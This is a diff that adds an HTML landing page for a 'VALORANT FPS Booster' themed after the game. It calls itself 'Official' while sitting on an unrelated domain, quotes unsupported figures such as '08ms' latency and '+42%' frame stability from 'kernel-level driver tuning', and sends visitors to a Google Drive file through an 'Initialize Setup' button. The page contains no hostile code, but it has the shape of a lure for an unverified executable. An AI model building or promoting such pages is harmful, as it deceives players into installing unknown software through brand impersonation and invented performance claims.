@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VALORANT FPS Booster | Reduce Latency & Ping Optimizer</title>
+    <meta name="description" content="Official performance optimization console for VALORANT. Eliminate input lag, stabilize frame rates, and optimize network throughput.">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://valorant-booster.io/">
+    
+    <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "SoftwareApplication",
+      "name": "VALORANT Performance Optimizer",
+      "applicationCategory": "GameUtility",
+      "operatingSystem": "Windows 10, 11",
+      "description": "Tactical performance optimization tool for reducing ping and stabilizing FPS in VALORANT."
+    }
+    </script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&family=Orbitron:wght@400;700&display=swap');
+
+        :root {
+            --val-red: #ff4655;
+            --val-dark: #0f1923;
+            --val-light: #ece8e1;
+            --val-gray: #768087;
+        }
+
+        body {
+            background-color: var(--val-dark);
+            color: var(--val-light);
+            font-family: 'Roboto Condensed', sans-serif;
+            overflow-x: hidden;
+            background-image: radial-gradient(circle at top right, #1a2530, #0f1923);
+        }
+
+        .clip-panel {
+            clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+            background: rgba(236, 232, 225, 0.05);
+            border: 1px solid rgba(236, 232, 225, 0.1);
+        }
+
+        .val-heading { font-family: 'Orbitron', sans-serif; letter-spacing: 2px; }
+
+        .glitch-border {
+            position: relative;
+            border-left: 2px solid var(--val-red);
+        }
+
+        .btn-download {
+            clip-path: polygon(0 0, 90% 0, 100% 100%, 0 100%);
+            background: var(--val-red);
+            transition: all 0.3s ease;
+        }
+
+        .btn-download:hover {
+            transform: skewX(-5deg);
+            filter: brightness(1.2);
+        }
+
+        .telemetry-val { color: var(--val-red); font-family: 'Orbitron', sans-serif; }
+
+        .scanline {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(to bottom, transparent 50%, rgba(0,0,0,0.1) 50%);
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body class="p-4 md:p-12">
+    <div class="scanline"></div>
+
+    <header class="flex justify-between items-end mb-16 border-b border-white/10 pb-6">
+        <div>
+            <h1 class="text-4xl md:text-6xl font-bold uppercase val-heading">Valorant Core</h1>
+            <p class="text-val-gray tracking-widest text-sm mt-2 uppercase">Performance Optimization Suite // V.26.0</p>
+        </div>
+        <div class="text-right">
+            <div class="text-xs uppercase text-val-gray">Status</div>
+            <div class="text-green-500 font-mono text-sm">SYSTEM STABLE</div>
+        </div>
+    </header>
+
+    <main class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+        <!-- Dashboard Panel -->
+        <section class="lg:col-span-8 clip-panel p-8">
+            <h2 class="text-2xl font-bold uppercase mb-8 border-l-4 border-val-red pl-4">Optimization Protocols</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div class="bg-black/30 p-6 border-b border-white/5">
+                    <span class="telemetry-val block text-2xl">08ms</span>
+                    <h3 class="text-sm uppercase tracking-tighter mt-2">Latency Floor</h3>
+                    <p class="text-xs text-gray-400 mt-2">Network packet prioritization via kernel-level driver tuning.</p>
+                </div>
+                <div class="bg-black/30 p-6 border-b border-white/5">
+                    <span class="telemetry-val block text-2xl">+42%</span>
+                    <h3 class="text-sm uppercase tracking-tighter mt-2">Frame Stability</h3>
+                    <p class="text-xs text-gray-400 mt-2">Engine frame-time smoothing for consistent output at high refresh.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Command Panel -->
+        <section class="lg:col-span-4 flex flex-col gap-6">
+            <div class="clip-panel p-8 flex flex-col justify-between h-full">
+                <div>
+                    <h2 class="val-heading text-lg mb-6 uppercase">Deploy Optimizer</h2>
+                    <ul class="space-y-4 text-sm text-val-gray">
+                        <li class="glitch-border pl-4 py-1">Direct Memory Access Optimization</li>
+                        <li class="glitch-border pl-4 py-1">Interrupt Latency Mitigation</li>
+                        <li class="glitch-border pl-4 py-1">Resource Priority Locking</li>
+                    </ul>
+                </div>
+                
+                <a href="https://drive.google.com/file/d/1e73qTVLJxUPnC9FrjnsiO4TMZ7HDd6FK/view?usp=sharing" 
+                   class="btn-download block text-center py-4 mt-8 font-bold text-lg uppercase tracking-widest">
+                    Initialize Setup
+                </a>
+            </div>
+        </section>
+    </main>
+
+    <footer class="mt-20 border-t border-white/10 pt-8 text-center text-[10px] text-gray-500 uppercase tracking-[0.2em]">
+        Valorant Core Engine © 2026 // Tactical Performance Utility // Internal Use Only
+    </footer>
+</body>
+</html>
